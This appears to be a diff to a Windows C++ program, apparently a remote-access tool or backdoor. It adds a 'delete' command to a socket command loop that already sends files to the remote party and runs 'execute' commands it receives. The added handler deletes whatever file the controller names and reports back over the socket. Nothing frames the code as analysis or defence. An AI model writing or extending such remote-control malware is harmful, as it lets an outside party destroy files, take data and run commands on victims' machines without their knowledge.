@@ -264,6 +264,16 @@ int main(int argc, char* argv[])
                 send(s, callback.c_str(), callback.size(), 0);
                 SendFile(s, &filePath[0]);
             }
+            else if (command.substr(0, 6) == "delete") {
+                std::string filename = command.substr(7);
+                std::string callback;
+                if (DeleteFile(filename.c_str()))
+                    callback = filename + " was deleted";
+                else
+                    callback = "Something gone wrong..." + std::to_string(GetLastError());
+
+                send(s, callback.c_str(), callback.size(), 0);
+            }
             else if (command.substr(0, 7) == "execute")
             { 
                 std::string cmd = command.substr(8);
